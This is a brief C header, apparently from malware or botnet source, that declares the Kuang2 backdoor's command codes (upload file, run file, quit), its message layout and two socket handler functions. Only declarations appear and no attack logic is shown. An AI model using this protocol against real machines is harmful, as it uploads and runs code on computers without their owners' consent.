#ifndef NO_KUANG2

#define	K2_UPLOAD_FILE	0x46445055
#define	K2_ERROR	0x52525245
#define	K2_DONE		0x454E4F44
#define	K2_RUN_FILE	0x464E5552
#define	K2_QUIT		0x54495551	

typedef struct {
	unsigned int command;
	union {
		char bdata[1024-4];
		struct {
			unsigned int param;
			char sdata[1024-8];
		};
	};
} Message, *pMessage;

int KUANG_Reciev(SOCKET sock);
int KUANG(SOCKET sock);
#endif
